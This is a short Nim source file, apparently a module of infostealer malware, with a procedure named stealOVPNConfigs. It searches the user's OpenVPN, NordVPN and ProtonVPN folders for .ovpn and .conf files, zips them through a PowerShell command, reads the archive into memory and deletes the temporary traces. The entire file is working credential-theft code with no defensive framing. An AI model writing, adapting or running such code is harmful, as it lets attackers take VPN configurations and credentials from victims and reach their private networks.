import os

proc stealOVPNConfigs(): string =
  let searchPaths = [
    getEnv("USERPROFILE") / "OpenVPN" / "config",
    getEnv("APPDATA") / "NordVPN",
    getEnv("APPDATA") / "ProtonVPN"
  ]
  
  let tempDir = getTempDir() & "vpn_" & $getCurrentProcessId()
  createDir(tempDir)
  
  var count = 0
  for searchPath in searchPaths:
    if dirExists(searchPath):
      for file in walkFiles(searchPath / "*.ovpn"):
        copyFile(file, tempDir / extractFilename(file))
        count += 1
      for file in walkFiles(searchPath / "*.conf"):
        copyFile(file, tempDir / extractFilename(file))
        count += 1
  
  if count == 0:
    removeDir(tempDir)
    return ""
  
  let zipFile = getTempDir() & "vpn.zip"
  discard execShellCmd("powershell -c \"Compress-Archive -Path '" & tempDir & "\\*' -DestinationPath '" & zipFile & "' -Force\"")
  
  var result = ""
  if fileExists(zipFile):
    result = readFile(zipFile)
  
  removeDir(tempDir)
  removeFile(zipFile)
  
  return result

when isMainModule:
  let data = stealOVPNConfigs()
  if data != "":
    echo "[+] VPN configs: ", data.len, " bytes"
    writeFile("vpn_test.zip", data)